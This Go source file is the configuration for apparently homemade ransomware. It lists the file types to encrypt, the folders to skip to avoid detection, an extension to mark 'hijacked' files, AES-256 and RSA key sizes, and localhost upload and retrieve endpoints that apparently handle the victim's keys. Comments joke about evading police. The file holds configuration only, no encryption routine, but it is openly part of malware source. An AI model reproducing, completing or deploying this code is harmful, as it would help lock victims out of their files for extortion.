package main

// Walk da line boys.....
var Extensions = [...]string{ 
	"txt",
	"doc",
	"jpg",
	"png",
	"xls",
	"xlsx",
	"pptx",
	"docx",
	"asp",
	"php",
	"html",
	"xml",
	"psd",
	"mp4",
	"mov",
}

// Dodgin the fuzz boys.....

var IgnoreDirs = [...]string{ 
	"AppData",
	".",
}

const ( 
	// EXT to append to files that are hijacked...
	LockedExtension = ".fucked"

	// ProcessMax X files, then chill 
	ProcessMax int = 1

	// KeySize in bytes (AES-256)
	KeySize int = 32

	// Bits Keypair bit size (Higher = slower)
	Bits int = 1024

	// EncryptedHeaderSize 
	EncryptedHeaderSize int = 128 

	// Endpoint web serverr URL 
	UploadEndpoint = "http://localhost:1312/upload"

	RetrieveEndpoint = "http://localhost:1312/retrieve"

)